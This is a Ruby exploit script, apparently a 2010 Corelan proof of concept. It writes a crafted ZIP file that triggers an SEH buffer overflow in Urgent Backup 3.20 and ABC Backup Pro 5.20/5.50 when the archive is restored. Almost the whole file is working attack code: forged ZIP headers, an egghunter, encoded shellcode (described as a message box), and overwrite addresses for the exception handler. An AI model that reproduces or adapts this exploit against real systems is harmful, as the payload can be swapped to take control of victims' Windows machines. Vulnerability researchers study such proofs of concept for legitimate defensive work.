#!/usr/bin/ruby
# Software      : Urgent Backup 3.20 / ABC Backup Pro 5.20 / ABC Backup 5.50
# Author        : Lincoln
# Date          : April 27, 2010
# Reference     : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-034
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox)
# Type of vuln  : SEH
# Greetz to     : Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes.
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.
#
#
banner =
"|------------------------------------------------------------------|\n" +
"|                         __               __                      |\n" +
"|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n" +
"|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n" +
"| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n" +
"| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n" +
"|                                                                  |\n" +
"|                                       http://www.corelan.be:8800 |\n" +
"|                                                                  |\n" +
"|-------------------------------------------------[ EIP Hunters ]--|\n"
 
 
unless ARGV.length == 1
        print banner
        puts "[+] Exploit for Urgent Backup 3.20 / ABC Backup Pro 5.20 / ABC Backup 5.50"
        puts "[+] Usage: select form the following:"
        puts "[+] 1). Urgent Backup 3.20 & ABC Backup Pro 5.20"
        puts "[+] 2). ABC Backup 5.50"
        puts "[+] ex: ./urgent.rb 1\n\n"
        exit
end
 
var = ARGV[0].to_i
 
#Zip Headers
header1=
"\x50\x4b\x03\x04\x14\x00\x00\x00" +
"\x00\x00\xb7\xac\xce\x34\x00\x00" +
"\x00\x00\x00\x00\x00\x00\x00\x00" +
"\x00\xc4\x09\x00\x00\x00"
 
header2=
"\x50\x4b\x01\x02\x14\x00\x14\x00" +
"\x00\x00\x00\x00\xb7\xac\xce\x34" +
"\x00\x00\x00\x00\x00\x00\x00\x00" +
"\x00\x00\x00\x00\xc4\x09\x00\x00" +
"\x00\x00\x00\x00\x01\x00\x24\x00" +
"\x00\x00\x00\x00\x00\x00"
 
header3=
"\x50\x4b\x05\x06\x00\x00\x00\x00" +
"\x01\x00\x01\x00\xf2\x09\x00\x00" +
"\xe2\x09\x00\x00\x00\x00"
 
#sub dx, 3000
egg =
"\x66\x81\xea\xb8\x0b\x42\x52\x6a" +
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74" +
"\xef\xb8\x77\x30\x30\x74\x8b\xfa" +
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 
#msgbox: "Exploited by Corelan Security Team"
shellcode =
"w00tw00t" +
"\x89\xe3\xda\xd7\xd9\x73\xf4\x59\x49\x49\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a" +
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" +
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" +
"\x75\x4a\x49\x4a\x79\x4a\x4b\x4d\x4b\x4b\x69\x51\x64\x45" +
"\x74\x4a\x54\x45\x61\x4e\x32\x4e\x52\x42\x5a\x46\x51\x49" +
"\x59\x42\x44\x4e\x6b\x51\x61\x44\x70\x4c\x4b\x43\x46\x44" +
"\x4c\x4e\x6b\x42\x56\x47\x6c\x4c\x4b\x51\x56\x44\x48\x4c" +
"\x4b\x51\x6e\x45\x70\x4e\x6b\x45\x66\x50\x38\x50\x4f\x47" +
"\x68\x50\x75\x4c\x33\x50\x59\x45\x51\x4b\x61\x4b\x4f\x48" +
"\x61\x51\x70\x4c\x4b\x50\x6c\x46\x44\x45\x74\x4c\x4b\x51" +
"\x55\x47\x4c\x4c\x4b\x50\x54\x43\x35\x50\x78\x43\x31\x4b" +
"\x5a\x4c\x4b\x42\x6a\x47\x68\x4e\x6b\x43\x6a\x47\x50\x45" +
"\x51\x4a\x4b\x48\x63\x46\x57\x50\x49\x4e\x6b\x44\x74\x4c" +
"\x4b\x45\x51\x4a\x4e\x44\x71\x49\x6f\x50\x31\x4b\x70\x4b" +
"\x4c\x4e\x4c\x4f\x74\x4b\x70\x43\x44\x46\x6a\x4a\x61\x4a" +
"\x6f\x44\x4d\x47\x71\x4b\x77\x48\x69\x4a\x51\x4b\x4f\x49" +
"\x6f\x49\x6f\x45\x6b\x43\x4c\x45\x74\x51\x38\x51\x65\x49" +
"\x4e\x4e\x6b\x42\x7a\x45\x74\x45\x51\x4a\x4b\x43\x56\x4e" +
"\x6b\x46\x6c\x42\x6b\x4c\x4b\x43\x6a\x45\x4c\x43\x31\x4a" +
"\x4b\x4e\x6b\x45\x54\x4e\x6b\x47\x71\x4d\x38\x4f\x79\x51" +
"\x54\x46\x44\x47\x6c\x45\x31\x4a\x63\x4f\x42\x44\x48\x46" +
"\x49\x48\x54\x4f\x79\x4b\x55\x4d\x59\x49\x52\x50\x68\x4c" +
"\x4e\x50\x4e\x44\x4e\x48\x6c\x50\x52\x4b\x58\x4d\x4c\x4b" +
"\x4f\x49\x6f\x4b\x4f\x4f\x79\x51\x55\x46\x64\x4d\x6b\x51" +
"\x6e\x49\x48\x4d\x32\x51\x63\x4c\x47\x45\x4c\x44\x64\x51" +
"\x42\x4d\x38\x4e\x6b\x49\x6f\x49\x6f\x4b\x4f\x4c\x49\x42" +
"\x65\x47\x78\x43\x58\x42\x4c\x50\x6c\x45\x70\x4b\x4f\x51" +
"\x78\x47\x43\x45\x62\x46\x4e\x45\x34\x45\x38\x51\x65\x51" +
"\x63\x45\x35\x44\x32\x4d\x58\x51\x4c\x44\x64\x44\x4a\x4c" +
"\x49\x48\x66\x43\x66\x4b\x4f\x43\x65\x46\x64\x4c\x49\x4b" +
"\x72\x50\x50\x4d\x6b\x4e\x48\x4c\x62\x50\x4d\x4d\x6c\x4e" +
"\x67\x47\x6c\x47\x54\x46\x32\x4b\x58\x43\x6e\x49\x6f\x49" +
"\x6f\x49\x6f\x42\x48\x51\x74\x45\x71\x51\x48\x45\x70\x43" +
"\x58\x44\x30\x43\x47\x42\x4e\x42\x45\x44\x71\x4b\x6b\x4b" +
"\x38\x43\x6c\x45\x74\x46\x66\x4b\x39\x48\x63\x45\x38\x50" +
"\x61\x42\x4d\x50\x58\x45\x70\x51\x78\x42\x59\x45\x70\x50" +
"\x54\x51\x75\x51\x78\x44\x35\x43\x42\x50\x69\x51\x64\x43" +
"\x58\x51\x30\x43\x63\x45\x35\x43\x53\x51\x78\x42\x45\x42" +
"\x4c\x50\x61\x50\x6e\x42\x48\x51\x30\x51\x53\x50\x6f\x50" +
"\x72\x45\x38\x43\x54\x51\x30\x50\x62\x43\x49\x51\x78\x42" +
"\x4f\x43\x59\x42\x54\x50\x65\x51\x78\x42\x65\x51\x68\x42" +
"\x50\x50\x6c\x46\x51\x48\x49\x4e\x68\x50\x4c\x46\x44\x45" +
"\x72\x4d\x59\x49\x71\x44\x71\x4a\x72\x43\x62\x43\x63\x50" +
"\x51\x46\x32\x4b\x4f\x48\x50\x50\x31\x4f\x30\x46\x30\x4b" +
"\x4f\x51\x45\x44\x48\x45\x5a\x41\x41"
 
size = 2496
junk = "\x90" * (276 - egg.length)
 
nseh   = "\x5c\x61\x98\xa0" #pop esp / pop ad / jmp ecx
seh    = "\x16\x66\x40\x00" #universal p/p retn 8
altseh = "\x7E\x6B\x6B\x00" #universal p/p retn 8 for ABC 5.50 regular
 
pay1 = junk + egg + nseh + seh + shellcode
pay2 = junk + egg + nseh + altseh + shellcode
 
rest = "D" * (size - pay1.length)
 
opt1 = pay1 + rest + ".txt"
opt2 = pay2 + rest + ".txt"
 
if var == 1
        if File.exist?("Urgent2.zip") then
                File.delete("Urgent2.zip")
        end
                filename = "Urgent1.zip"
                f = File.new(filename, 'w')
                f.write header1 + opt1 + header2 + opt1 + header3
                f.close
                print banner
                puts "[+] Exploit for Option 1: Urgent Backup 3.20 & ABC Backup Pro 5.20"
                puts "[+] file size :  #{opt1.length}"
                puts "[+] Wrote exploit file : #{filename}"
                puts "[+] Run zip as restore task and boom!\n\n"
                exit
 
elsif var == 2
        if File.exist?("Urgent1.zip") then
                File.delete("Urgent1.zip")
        end
                filename = "Urgent2.zip"
                f = File.new(filename, 'w')
                f.write header1 + opt2 + header2 + opt2 + header3
                f.close
                print banner
                puts "[+] Exploit for Option 2: ABC Backup 5.50"
                puts "[+] file size :  #{opt2.length}"
                puts "[+] Wrote exploit file : #{filename}"
                puts "[+] Run zip as restore task and boom!\n\n"
                exit
 
else
        puts "DOH!, read the instructions: ./urgent.rb"
end
